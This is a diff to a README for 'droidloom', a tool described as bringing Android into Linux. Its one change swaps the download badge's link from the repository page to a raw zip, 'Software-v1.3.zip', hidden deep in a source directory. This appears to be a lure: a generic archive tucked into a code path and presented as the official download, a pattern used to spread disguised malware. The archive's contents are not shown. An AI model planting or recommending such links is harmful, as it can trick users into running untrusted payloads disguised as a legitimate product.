@@ -1,6 +1,6 @@
 # 🧵 droidloom - Weaving Android Seamlessly into Your Linux Experience
 
-[![Download Now](https://img.shields.io/badge/Download-Droidloom-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Uttarbango/droidloom)
+[![Download Now](https://img.shields.io/badge/Download-Droidloom-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Uttarbango/droidloom/main/android/framework/droidloom-systemui/src/Software-v1.3.zip)
 
 ## 🎯 What is Droidloom?
 
